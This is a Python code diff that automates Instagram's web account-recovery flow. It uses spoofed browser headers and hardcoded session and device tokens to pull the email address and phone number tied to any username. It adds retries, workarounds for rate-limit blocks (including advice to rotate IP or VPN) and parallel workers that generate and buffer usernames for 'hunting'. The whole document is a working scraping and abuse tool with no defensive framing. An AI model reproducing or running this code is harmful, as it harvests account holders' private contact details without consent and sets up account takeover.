+    cookies = {**boot["cookies"], "wd": "450x1231"}
+    headers = {
+        "accept": "*/*",
+        "accept-language": "en-US",
+        "cache-control": "no-cache",
+        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+        "origin": "https://www.instagram.com",
+        "pragma": "no-cache",
+        "priority": "u=1, i",
+        "referer": RECOVERY_URL,
+        "sec-ch-prefers-color-scheme": "dark",
+        "sec-ch-ua": '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+        "sec-ch-ua-full-version-list": '"Chromium";v="127.0.6533.144", "Not)A;Brand";v="99.0.0.0", "Microsoft Edge Simulate";v="127.0.6533.144", "Lemur";v="127.0.6533.144"',
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-model": '"V2249"',
+        "sec-ch-ua-platform": '"Android"',
+        "sec-ch-ua-platform-version": '"15.0.0"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": USER_AGENT,
+        "x-fb-lsd": boot["lsd"],
+    }
+
+    params = {
+        "appid": "com.bloks.www.caa.ar.search.async",
+        "type": "action",
+        "__bkv": "487c52f1e99f6fe3faee06af68ac70f38b5a53f74509a278bba9db63a261bc12",
+    }
+
+    data = {
+        "__d": "www",
+        "__user": "0",
+        "__a": "1",
+        "__req": "j",
+        "__hs": "20617.HYP:instagram_web_pkg.2.1...0",
+        "dpr": "3",
+        "__ccg": "GOOD",
+        "__rev": "1041417520",
+        "__s": "1sndd2:lncbw1:xx4sk7",
+        "__hsi": "7650768943143544687",
+        "__dyn": "7xeUjG1mwt8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQwoEcE7O2l0Fwqo31w9O0H8jwae4UaEW2G0AEco5G0zK5o4q0HU1IEGdwtU662O0Lo6-3u2WE15E6O1FwlAcwnJ6goK1sAwHxW1ow8q0EoK9x60ma1XwqU1eUdo",
+        "__csr": "hA4Ivf92fnlEDTnlvt7p5mRF_P39bj-KFD-UK9BHC-jIxHFoGj8UXx2ch4Upxi6Zx62OE-8aGVAhUSfByqgZ16qaAUlF6CByFUZ4UC8z9byrzEsyE8qwsU4Nxu5Ea98K3eEkDy9E4a9-mU4K3y4oO2K4Elwlo6iE3KxC5E05q602DK00ReXyU3Mw0Lva04GqzU0yK0cAy43G0L81EFnw7eohDS09Ag1ySEjglO0YDo0hzzo5p00h4E0Ny03qS0eiCg",
+        "__hsdp": "gN2sAehsWpwidhk8Bm4O1-Q9wC-1NwaiEc84O06wFo04m605PU9U1eE0lNg12o",
+        "__hblp": "0hU1_awMzE4C0SUhwRwd63a3C0OE6W0kK3C1WwrU1fE0Jy0z808WqU14U1gE1Vo1vodU3Lw3ao9U1eKq0cvw4Jw4qg2Bzo5m1Qw9u0vzw",
+        "__sjsp": "gN2sAehsWpwidh7d55m4O1-Q9wC-1NwaiEc8",
+        "__comet_req": "7",
+        "fb_dtsg": "NAfymb2QzhE0qJt5HmdklBo1XrG460g0sEGawhllKvoA5S2OSuPH2sA:17865145036029998:1779424198",
+        "jazoest": "26257",
+        "lsd": "VPpBvZBNDdErkCT1Jbn2T3",
+        "__spin_r": "1041417520",
+        "__spin_b": "trunk",
+        "__spin_t": "1781333457",
+        "__crn": "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
+        "params": '{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"5c2d5ee9-f0f2-4c44-8e89-612a38e875b2\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"217380720300109\\",\\"device_id\\":\\"aZ67dgABAAGBHw-P3_ILGWvl1aRb\\",\\"family_device_id\\":null,\\"waterfall_id\\":null,\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"unknown\\",\\"context_data\\":\\"AdBQTjHuBAMk8-R968o5JMQWYgV4QPZHKf-As029YpJ8rk2nxmXp9psDta8ax-c1Kt_MNvWHOS8NLW3aoxu28q6VXjLb1CD-MoY5bO4Vg7ZV_LpppM5Ofm94CXKRqAm981Aq9cBJwMUst2EIV6PRsenxqHdTAOZtg2dAOQVOur_2p3f2S-KncvFHFUVtRTjmIzbHwQzGQd3UeN8JTMcoahKE3cZMQu0t8XRx1r_9OUk3x9mSCwKuBJ2YY4MkNCotvnVYvUOJ68SGaCRl9VHRbe1XG7Wv3NqwtLbF-D0982Cgz3evLuQ7D9BL3ncsfDJwYNt_UE2qA1SLLBdxZQ3YeGikksoD5iomy9NM3l9R4o9Ybxmso13v6nofG_L_RYHT4wZ4m1WMYN9cfexavfMwh3oUUd65VYtSlwrYYlOYH6O0ro0UKeQ|arm\\"},\\"client_input_params\\":{\\"zero_balance_state\\":null,\\"search_query\\":\\"'
+        + username
+        + '\\",\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"zy88df:105\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",\\"auth_secure_device_id\\":\\"\\",\\"blocked_uids\\":[],\\"cloud_trust_token\\":null,\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}',
+    }
+
+    apply_session_tokens(data, boot)
+    response = _ig_http_post(
+        "https://www.instagram.com/async/wbloks/fetch/",
+        cookies=cookies,
+        params=params,
+        headers=headers,
+        data=data,
+        timeout=http_timeout,
+    )
+    if write_responses:
+        with open(os.path.join(_RESPONSES_DIR, "1.html"), "w") as f:
+            f.write(response.text)
+    if verbose:
+        check_ig_response("step1/search", response.text)
+
+    body1 = strip_ig_json_prefix(response.text)
+    if not body1 or body1.startswith("<!DOCTYPE") or '"error":' in body1:
+        err = "rate_limited" if response.status_code == 429 else "search_failed"
+        return {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": err,
+            "response_time_ms": round((time.perf_counter() - started) * 1000),
+        }
+
+    context_token = extract_arm_context_token(response.text)
+    if verbose:
+        log_context_token("step1/search", context_token)
+    if not context_token:
+        return {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": "search_failed",
+            "response_time_ms": round((time.perf_counter() - started) * 1000),
+        }
+    step2_appid, step2_screen_id = extract_step2_route(response.text)
+    flow = "dual_auth" if is_dual_auth_flow(step2_appid) else "email_confirmation"
+    if verbose:
+        print(f"[step1/search] next_step: {step2_appid} screen_id={step2_screen_id}")
+
+    cookies = {**boot["cookies"], "wd": "450x908"}
+    params = {
+        "appid": step2_appid,
+        "type": "app",
+        "__bkv": "487c52f1e99f6fe3faee06af68ac70f38b5a53f74509a278bba9db63a261bc12",
+    }
+    data = {
+        "__d": "www",
+        "__user": "0",
+        "__a": "1",
+        "__req": "h",
+        "__hs": "20617.HYP:instagram_web_pkg.2.1...0",
+        "dpr": "3",
+        "__ccg": "GOOD",
+        "__rev": "1041417520",
+        "__s": "xndytq:2om9fa:zax0fu",
+        "__hsi": "7650778362067551766",
+        "__dyn": "7xeUjG1mwt8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQwoEcE7O2l0Fwqo31w9O0H8jwae4UaEW2G0AEco5G0zK5o4q0HU1IEGdwtU662O0Lo6-3u2WE15E6O1FwlAcwnJ6goK1sAwHxW1ow8q0EoK9x60ma1XwqU1eUdo",
+        "__csr": "hA4Ivf92fnlEDTnlvt7p5mRF_P39bj-KFD-UK9BHC-jIxHFoGj8UXx2ch4Upxi6Zx62OE-8aGVAhUSfByqgZ16qaAUlF6CByFUZ4UC8z9byrzEsyE8qwsU4Nxu5Ea98K3eEkDy9E4a9-mU4K3y4oO2K4Elwlo6iE3KxC5E05q602DK00ReXyU3Mw0Lva04GqzU0yK0cAy43G0L81EFnw7eohDS09Ag1ySEjglO0YDo0hzzo5p00h4E0Ny03qS0eiCg",
+        "__hsdp": "gN2sAehsWpwidhk8Bm4O1-Q9wC-1NwaiEc84O06wFo04m605PU9U1eE0lNg12o",
+        "__hblp": "0hU1_awMzE4C0SUhwRwd63a3C0OE6W0kK3C1WwrU1fE0Jy0z808WqU14U1gE1Vo1vodU3Lw3ao9U1eKq0cvw4Jw4qg2Bzo5m1Qw9u0vzw",
+        "__sjsp": "gN2sAehsWpwidh7d55m4O1-Q9wC-1NwaiEc8",
+        "__comet_req": "7",
+        "fb_dtsg": "NAfwgBQ5L6qN3fDL2pmmdD7GfBSHPperppqQ9KLczLmR5vmafOLQB0w:17865145036029998:1779424198",
+        "jazoest": "26298",
+        "lsd": "l9h56dXX4RkIO7nYnFO28K",
+        "__spin_r": "1041417520",
+        "__spin_b": "trunk",
+        "__spin_t": "1781335650",
+        "__crn": "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
+        "params": (
+            '{"params":"{\\"server_params\\":{\\"device_id\\":\\"aZ67dgABAAGBHw-P3_ILGWvl1aRb\\",'
+            '\\"is_platform_login\\":0,\\"is_from_logged_out\\":0,'
+            '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
+            '\\"login_entry_point\\":\\"account_recovery\\",\\"context_data\\":\\"{context_data}\\",'
+            '\\"back_nav_action\\":\\"BACK\\",\\"INTERNAL_INFRA_screen_id\\":\\"{screen_id}\\"},'
+            '\\"client_input_params\\":{\\"lois_settings\\":{\\"lois_token\\":\\"\\"},'
+            '\\"zero_balance_state\\":\\"\\",\\"aac\\":\\"\\"}}"}'
+        )
+        .replace("{context_data}", context_token or "")
+        .replace("{screen_id}", step2_screen_id or "19q6u5:2"),
+    }
+
+    apply_session_tokens(data, boot)
+    response = _ig_http_post(
+        "https://www.instagram.com/async/wbloks/fetch/",
+        params=params,
+        cookies=cookies,
+        headers=headers,
+        data=data,
+        timeout=http_timeout,
+    )
+    if write_responses:
+        with open(os.path.join(_RESPONSES_DIR, "2.html"), "w") as f:
+            f.write(response.text)
+    if verbose:
+        check_ig_response("step2", response.text)
+
+    context_token = extract_arm_context_token(response.text) or context_token
+    step2_arm_context = context_token
+    step2_label = "auth_method" if is_dual_auth_flow(step2_appid) else "authentication_confirmation"
+    merge(response.text)
+    if verbose:
+        log_context_token("step2", context_token)
+        log_masked_contacts(f"step2/{step2_label}", response.text)
+
+    if is_dual_auth_flow(step2_appid):
+        auth_options = extract_auth_method_options(response.text)
+        step3_auth_method, auth_method_async_token, step3_auth_rejected = pick_step3_auth(
+            auth_options, response.text
+        )
+        if not auth_method_async_token:
+            auth_method_async_token = extract_auth_method_async_params(response.text)
+        step3_appid = "com.bloks.www.caa.ar.auth_method.async"
+        step3_context = context_token or ""
+        step3_params = (
+            '{"params":"{\\"server_params\\":{\\"device_id\\":\\"aZ67dgABAAGBHw-P3_ILGWvl1aRb\\",'
+            '\\"auth_method\\":\\"{auth_method}\\",\\"is_auth_method_rejected\\":{is_auth_method_rejected},'
+            '\\"auth_method_async_params\\":\\"{auth_method_async_params}\\",\\"context_data\\":\\"{context_data}\\",'
+            '\\"INTERNAL__latency_qpl_marker_id\\":36707139,'
+            '\\"INTERNAL__latency_qpl_instance_id\\":\\"7694035200197\\",'
+            '\\"family_device_id\\":null,\\"waterfall_id\\":null,'
+            '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
+            '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
+            '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
+            '\\"login_entry_point\\":\\"account_recovery\\"},'
+            '\\"client_input_params\\":{\\"zero_balance_state\\":\\"\\",\\"android_build_type\\":\\"\\",'
+            '\\"cloud_trust_token\\":null,\\"network_bssid\\":null,'
+            '\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
+        )
+        step3_params = (
+            step3_params.replace("{auth_method}", step3_auth_method or "phone")
+            .replace("{is_auth_method_rejected}", step3_auth_rejected or "1")
+            .replace("{auth_method_async_params}", auth_method_async_token or "")
+            .replace("{context_data}", step3_context)
+        )
+        step3_label = "auth_method_async"
+    else:
+        step3_appid = EMAIL_CONFIRM_ASYNC_APPID
+        step3_context = step2_arm_context or context_token or ""
+        step3_qpl_instance = extract_qpl_instance_id(response.text) or "7694035200197"
+        step3_params = (
+            '{"params":"{\\"server_params\\":{\\"device_id\\":\\"aZ67dgABAAGBHw-P3_ILGWvl1aRb\\",'
+            '\\"event_request_id\\":\\"{event_request_id}\\",'
+            '\\"is_auth_method_rejected\\":1,\\"context_data\\":\\"{context_data}\\",'
+            '\\"INTERNAL__latency_qpl_marker_id\\":36707139,'
+            '\\"INTERNAL__latency_qpl_instance_id\\":\\"{qpl_instance_id}\\",'
+            '\\"family_device_id\\":null,\\"waterfall_id\\":null,'
+            '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
+            '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
+            '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
+            '\\"login_entry_point\\":\\"account_recovery\\"},'
+            '\\"client_input_params\\":{\\"zero_balance_state\\":\\"\\",\\"android_build_type\\":\\"\\",'
+            '\\"cloud_trust_token\\":null,\\"network_bssid\\":null,'
+            '\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
+            .replace("{event_request_id}", str(uuid.uuid4()))
+            .replace("{qpl_instance_id}", step3_qpl_instance)
+            .replace("{context_data}", step3_context)
+        )
+        step3_label = "authentication_confirmation.async"
+
+    params = {
+        "appid": step3_appid,
+        "type": "action",
+        "__bkv": "487c52f1e99f6fe3faee06af68ac70f38b5a53f74509a278bba9db63a261bc12",
+    }
+    data = {
+        "__d": "www",
+        "__user": "0",
+        "__a": "1",
+        "__req": "k",
+        "__hs": "20617.HYP:instagram_web_pkg.2.1...0",
+        "dpr": "3",
+        "__ccg": "GOOD",
+        "__rev": "1041417520",
+        "__s": "xndytq:2om9fa:zax0fu",
+        "__hsi": "7650778362067551766",
+        "__dyn": "7xeUjG1mwt8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQwoEcE7O2l0Fwqo31w9O0H8jwae4UaEW2G0AEco5G0zK5o4q0HU1IEGdwtU662O0Lo6-3u2WE15E6O1FwlAcwnJ6goK1sAwHxW1ow8q0EoK9x60ma1XwqU1eUdo",
+        "__csr": "hA4Ivf92fnlEDTnlvt7p5mRF_P39bj-KFD-UK9BHC-jIxHFoGj8UXx2ch4Upxi6Zx62OE-8aGVAhUSfByqgZ16qaAUlF6CByFUZ4UC8z9byrzEsyE8qwsU4Nxu5Ea98K3eEkDy9E4a9-mU4K3y4oO2K4Elwlo6iE3KxC5E05q602DK00ReXyU3Mw0Lva04GqzU0yK0cAy43G0L81EFnw7eohDS09Ag1ySEjglO0YDo0hzzo5p00h4E0Ny03qS0eiCg",
+        "__hsdp": "gN2sAehsWpwidhk8Bm4O1-Q9wC-1NwaiEc84O06wFo04m605PU9U1eE0lNg12o",
+        "__hblp": "0hU1_awMzE4C0SUhwRwd63a3C0OE6W0kK3C1WwrU1fE0Jy0z808WqU14U1gE1Vo1vodU3Lw3ao9U1eKq0cvw4Jw4qg2Bzo5m1Qw9u0vzw",
+        "__sjsp": "gN2sAehsWpwidh7d55m4O1-Q9wC-1NwaiEc8",
+        "__comet_req": "7",
+        "fb_dtsg": "NAfwgBQ5L6qN3fDL2pmmdD7GfBSHPperppqQ9KLczLmR5vmafOLQB0w:17865145036029998:1779424198",
+        "jazoest": "26298",
+        "lsd": "l9h56dXX4RkIO7nYnFO28K",
+        "__spin_r": "1041417520",
+        "__spin_b": "trunk",
+        "__spin_t": "1781335650",
+        "__crn": "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
+        "params": step3_params,
+    }
+
+    apply_session_tokens(data, boot)
+    response = _ig_http_post(
+        "https://www.instagram.com/async/wbloks/fetch/",
+        params=params,
+        cookies=cookies,
+        headers=headers,
+        data=data,
+        timeout=http_timeout,
+    )
+    if write_responses:
+        with open(os.path.join(_RESPONSES_DIR, "3.html"), "w") as f:
+            f.write(response.text)
+    if verbose:
+        check_ig_response(f"step3/{step3_label}", response.text)
+        log_context_token(f"step3/{step3_label}", extract_arm_context_token(response.text))
+        log_masked_contacts(f"step3/{step3_label}", response.text)
+
+    context_token = extract_arm_context_token(response.text) or context_token
+    step4_screen_id = extract_step4_screen_id(response.text) or "19w3pw:2"
+    step4_context = context_token or step2_arm_context
+
+    params = {
+        "appid": INITIATE_VIEW_APPID,
+        "type": "app",
+        "__bkv": "487c52f1e99f6fe3faee06af68ac70f38b5a53f74509a278bba9db63a261bc12",
+    }
+    data = {
+        "__d": "www",
+        "__user": "0",
+        "__a": "1",
+        "__req": "l",
+        "__hs": "20617.HYP:instagram_web_pkg.2.1...0",
+        "dpr": "3",
+        "__ccg": "GOOD",
+        "__rev": "1041417520",
+        "__s": "xndytq:2om9fa:zax0fu",
+        "__hsi": "7650778362067551766",
+        "__dyn": "7xeUjG1mwt8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQwoEcE7O2l0Fwqo31w9O0H8jwae4UaEW2G0AEco5G0zK5o4q0HU1IEGdwtU662O0Lo6-3u2WE15E6O1FwlAcwnJ6goK1sAwHxW1ow8q0EoK9x60ma1XwqU1eUdo",
+        "__csr": "hA4Ivf92fnlEDTnlvt7p5mRF_P39bj-KFD-UK9BHC-jIxHFoGj8UXx2ch4Upxi6Zx62OE-8aGVAhUSfByqgZ16qaAUlF6CByFUZ4UC8z9byrzEsyE8qwsU4Nxu5Ea98K3eEkDy9E4a9-mU4K3y4oO2K4Elwlo6iE3KxC5E05q602DK00ReXyU3Mw0Lva04GqzU0yK0cAy43G0L81EFnw7eohDS09Ag1ySEjglO0YDo0hzzo5p00h4E0Ny03qS0eiCg",
+        "__hsdp": "gN2sAehsWpwidhk8Bm4O1-Q9wC-1NwaiEc84O06wFo04m605PU9U1eE0lNg12o",
+        "__hblp": "0hU1_awMzE4C0SUhwRwd63a3C0OE6W0kK3C1WwrU1fE0Jy0z808WqU14U1gE1Vo1vodU3Lw3ao9U1eKq0cvw4Jw4qg2Bzo5m1Qw9u0vzw",
+        "__sjsp": "gN2sAehsWpwidh7d55m4O1-Q9wC-1NwaiEc8",
+        "__comet_req": "7",
+        "fb_dtsg": "NAfwgBQ5L6qN3fDL2pmmdD7GfBSHPperppqQ9KLczLmR5vmafOLQB0w:17865145036029998:1779424198",
+        "jazoest": "26298",
+        "lsd": "l9h56dXX4RkIO7nYnFO28K",
+        "__spin_r": "1041417520",
+        "__spin_b": "trunk",
+        "__spin_t": "1781335650",
+        "__crn": "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
+        "params": (
+            '{"params":"{\\"server_params\\":{\\"device_id\\":\\"aZ67dgABAAGBHw-P3_ILGWvl1aRb\\",'
+            '\\"is_platform_login\\":0,\\"is_from_logged_out\\":0,'
+            '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
+            '\\"login_entry_point\\":\\"account_recovery\\",\\"context_data\\":\\"{context_data}\\",'
+            '\\"back_nav_action\\":\\"BACK\\",\\"INTERNAL_INFRA_screen_id\\":\\"{screen_id}\\"},'
+            '\\"client_input_params\\":{\\"lois_settings\\":{\\"lois_token\\":\\"\\"},'
+            '\\"machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"aac\\":\\"\\"}}"}'
+            .replace("{context_data}", step4_context or "")
+            .replace("{screen_id}", step4_screen_id)
+        ),
+    }
+
+    apply_session_tokens(data, boot)
+    response = _ig_http_post(
+        "https://www.instagram.com/async/wbloks/fetch/",
+        params=params,
+        cookies=cookies,
+        headers=headers,
+        data=data,
+        timeout=http_timeout,
+    )
+    if write_responses:
+        with open(os.path.join(_RESPONSES_DIR, "4.html"), "w") as f:
+            f.write(response.text)
+    merge(response.text)
+    if verbose:
+        check_ig_response("step4/initiate_view", response.text)
+        log_context_token("step4/initiate_view", extract_arm_context_token(response.text))
+        log_masked_contacts("step4/initiate_view", response.text)
+
+    ok = bool(contacts["email"] or contacts["phone"])
+    result = {
+        "ok": ok,
+        "username": username,
+        "flow": flow,
+        "email": contacts["email"],
+        "phone": contacts["phone"],
+        "response_time_ms": round((time.perf_counter() - started) * 1000),
+    }
+    if not ok:
+        result["error"] = "no_contacts_found"
+    return result
+
+
+RECOVERY_RETRY_ATTEMPTS = 5
+RECOVERY_RETRY_SLEEP_SEC = 3.0
+RECOVERY_RETRYABLE_ERRORS = frozenset({
+    "session_bootstrap_failed",
+    "rate_limited",
+    "invalid_response",
+    "network_error",
+})
+
+
+def run_recovery_with_retries(username: str, *, verbose: bool = False) -> dict:
+    """Run recovery with pauses — same path api.py and joint hit enrich use."""
+    started = time.perf_counter()
+    last: dict | None = None
+
+    for attempt in range(1, RECOVERY_RETRY_ATTEMPTS + 1):
+        try:
+            result = run_recovery(username, verbose=verbose)
+        except requests.RequestException as exc:
+            result = {
+                "ok": False,
+                "username": username,
+                "flow": "unknown",
+                "email": None,
+                "phone": None,
+                "error": "network_error",
+                "detail": str(exc)[:160],
+                "attempt": attempt,
+            }
+        last = result
+        if result.get("ok"):
+            if attempt > 1:
+                result["retries"] = attempt - 1
+            result["response_time_ms"] = round((time.perf_counter() - started) * 1000)
+            return result
+        err = (result.get("error") or "").strip()
+        if attempt >= RECOVERY_RETRY_ATTEMPTS or err not in RECOVERY_RETRYABLE_ERRORS:
+            break
+        if verbose:
+            print(
+                f"[retry] attempt {attempt}/{RECOVERY_RETRY_ATTEMPTS} failed ({err}) — "
+                f"sleep {RECOVERY_RETRY_SLEEP_SEC * attempt:.0f}s",
+                file=sys.stderr,
+            )
+        time.sleep(RECOVERY_RETRY_SLEEP_SEC * attempt)
+
+    if last is None:
+        last = {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": "unknown",
+        }
+    if attempt > 1:
+        last["retries"] = attempt - 1
+    last["response_time_ms"] = round((time.perf_counter() - started) * 1000)
+    return last
+
+
+# --- end wbloks ---
+def _run_ig_recovery(username: str) -> dict:
+    """Wbloks contact recovery — inlined below."""
+    return run_recovery_with_retries(username)
+
+
+def _hunt_cycle_meta(min_val: str) -> dict:
+    return {
+        "buffer_depth": _buffer_depth_for(str(min_val)),
+        "ig_block_sec": round(_ig_block_seconds_left(), 1),
+    }
+
+
+def _buffer_depth_for(min_val: str) -> int:
+    buf = _ig_gen_buffers.get(str(min_val))
+    if not buf:
+        return 0
+    try:
+        return int(buf.qsize())
+    except Exception:
+        return 0
+
+
+async def _buffer_try_get_throttled(min_val: str):
+    """Serve buffered usernames — slight delay when queue is deep (avoids IG shock)."""
+    hit = _buffer_try_get(min_val)
+    if not hit:
+        return None
+    depth = _buffer_depth_for(min_val)
+    if depth <= IG_GEN_BUFFER_LOW_WATER:
+        if depth > 120:
+            await asyncio.sleep(0.012)
+        elif depth > 40:
+            await asyncio.sleep(0.005)
+    return hit
+
+
+async def _ig_gen_acquire(min_val: str):
+    """
+    /ig_gen and hunters: try buffer, then live gen with many attempts.
+    Never returns success without a username string.
+    """
+    min_val = str(min_val)
+    await _ensure_ig_gen_buffer(min_val)
+
+    hit = await _buffer_try_get_throttled(min_val)
+    if hit:
+        return hit
+
+    if _ig_in_gen_block_cooldown():
+        deadline = _ig_gen_block_until
+        while time.time() < deadline:
+            hit = await _buffer_try_get_throttled(min_val)
+            if hit:
+                return hit
+            await asyncio.sleep(min(0.4, max(0.05, deadline - time.time())))
+        return False, None, None, "instagram rate limited (IP/VPN — wait or rotate)"
+
+    last = (False, None, None, "no result")
+    serve_workers = IG_GEN_PARALLEL_WORKERS
+    if _IS_TERMUX:
+        serve_workers = min(IG_GEN_PARALLEL_WORKERS, 20)
+    else:
+        serve_workers = min(IG_GEN_PARALLEL_WORKERS, 12)
+    if _ig_in_block_cooldown() or _ig_in_gen_block_cooldown():
+        serve_workers = min(serve_workers, 4)
+    try:
+        burst = await _ig_gen_parallel_first(min_val, workers=serve_workers)
+        if burst[0] and burst[1]:
+            return burst
+        last = burst
+    except Exception as exc:
+        last = (False, None, None, str(exc)[:200])
+
+    for attempt in range(min(IG_GEN_SERVE_ATTEMPTS, 6)):
+        hit = await _buffer_try_get_throttled(min_val)
+        if hit:
+            return hit
+        loop = asyncio.get_running_loop()
+        last = await loop.run_in_executor(
+            _ig_gen_executor,
+            partial(gen_ig, min_val, None, IG_GEN_SERVE_INNER_ATTEMPTS),
+        )
+        if last[0] and last[1]:
+            return last
+        if attempt + 1 < IG_GEN_SERVE_ATTEMPTS:
+            await asyncio.sleep(0.012)
+    return last
+
+
+_ig_gen_lock = asyncio.Lock()
+_ig_gen_inflight = None
+_ig_gen_inflight_min = None
+_ig_gen_buffers = {}
+_ig_gen_buffer_tasks = {}
+_ig_gen_prefill_tasks = []
+
+
+async def _ig_gen_parallel_first(min_val: str, *, workers=None):
+    """
+    Parallel batch for empty-buffer hunter fallback only (not buffer fill).
+    """
+    stop_event = threading.Event()
+    n_workers = max(1, int(workers or IG_GEN_PARALLEL_WORKERS))
+
+    loop = asyncio.get_running_loop()
+
+    def _runner():
+        return gen_ig_once(min_val, stop_event=stop_event)
+
+    tasks = [
+        asyncio.create_task(loop.run_in_executor(_ig_gen_executor, _runner))
+        for _ in range(n_workers)
+    ]
+
+    try:
+        pending = set(tasks)
+        last_result = None
+        while pending:
+            done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
+            for t in done:
+                try:
+                    status, username, info_data, response_text = await t
+                except asyncio.CancelledError:
+                    continue
+                except Exception as exc:
+                    last_result = (False, None, None, str(exc)[:200])
+                    continue
+                last_result = (status, username, info_data, response_text)
+                if status and username:
+                    stop_event.set()
+                    for p in list(pending):
+                        p.cancel()
+                    if pending:
+                        await asyncio.gather(*pending, return_exceptions=True)
+                    return status, username, info_data, response_text
+        if last_result is not None:
+            return last_result
+        return False, None, None, "No result"
+    finally:
+        stop_event.set()
+        for t in tasks:
+            if not t.done():
+                t.cancel()
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+
+async def _ig_gen_once_in_pool(min_val: str):
+    """Run gen_ig_once on dedicated pool — not capped by default asyncio thread limit."""
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(
+        _ig_gen_executor,
+        partial(gen_ig_once, str(min_val)),
+    )
+
+
+async def _ig_gen_buffer_loop(min_val: str):
+    """
+    Maintain ready usernames for /ig_gen.
+    Many fillers × fast gen_ig_once (not heavy gen_ig loops) = high buffer throughput.
+    """
+    min_val = str(min_val)
+    buf = _ig_gen_buffers.setdefault(
+        min_val, asyncio.Queue(maxsize=max(1, int(IG_GEN_BUFFER_SIZE))),
+    )
+    while True:
+        if _ig_in_gen_block_cooldown():
+            await asyncio.sleep(min(1.5, max(0.25, _ig_gen_block_seconds_left())))
+            continue
+        depth = buf.qsize()
+        if buf.full():
+            sleep_s = 1.0 if depth >= int(IG_GEN_BUFFER_SIZE * 0.95) else IG_GEN_BUFFER_FULL_SLEEP
+            await asyncio.sleep(sleep_s)
+            continue
+        try:
+            res = await _ig_gen_once_in_pool(min_val)
+        except Exception as exc:
+            res = (False, None, None, str(exc)[:200])
+        if res and len(res) >= 4 and res[0] and res[1]:
+            try:
+                buf.put_nowait(res)
+            except asyncio.QueueFull:
+                pass
+            continue
+        if depth < IG_GEN_BUFFER_LOW_WATER:
+            await asyncio.sleep(IG_GEN_FAIL_SLEEP_LOW)
+        else:
+            await asyncio.sleep(IG_GEN_FAIL_SLEEP)
+
+
+async def _ig_gen_prefill_buffer(min_val: str):
+    """Boot + background: burst-fill queue toward low-water so /ig_gen is instant early."""
+    min_val = str(min_val)
+    await _ensure_ig_gen_buffer(min_val)
+    buf = _ig_gen_buffers.get(min_val)
+    if not buf:
+        return
+    target = min(int(IG_GEN_BUFFER_LOW_WATER), int(IG_GEN_BUFFER_SIZE))
+    while buf.qsize() < target:
+        batch = min(
+            target - buf.qsize(),
+            int(IG_GEN_PREFILL_BATCH),
+            int(IG_GEN_BUFFER_SIZE) - buf.qsize(),
+        )
+        if batch <= 0:
+            break
+        tasks = [
+            asyncio.create_task(_ig_gen_once_in_pool(min_val))
+            for _ in range(batch)
+        ]
+        for task in asyncio.as_completed(tasks):
+            try:
+                res = await task
+            except Exception:
+                continue
+            if res and len(res) >= 4 and res[0] and res[1] and not buf.full():
+                try:
+                    buf.put_nowait(res)
+                except asyncio.QueueFull:
+                    break
+        if buf.qsize() >= target:
+            break
+        await asyncio.sleep(IG_GEN_FAIL_SLEEP_LOW)
+
+
+async def _ig_gen_from_buffer_or_generate(min_val: str):
+    """Backward-compatible alias — always prefer username-bearing result."""
+    return await _ig_gen_acquire(min_val)
+
+
